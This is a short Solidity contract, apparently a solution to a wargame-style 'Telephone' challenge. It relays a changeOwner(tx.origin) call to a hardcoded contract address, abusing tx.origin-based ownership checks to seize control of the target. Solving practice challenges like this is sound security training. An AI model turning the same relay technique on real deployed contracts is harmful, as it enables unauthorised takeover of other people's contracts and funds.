pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address) external;
}

contract TelephoneRelay {
    ITelephone target = ITelephone(0xFACB49be1Ca3f5C5258C82d8eBC2F18Af3daD2de);

    function relay() public {
        target.changeOwner(tx.origin);
    }
}
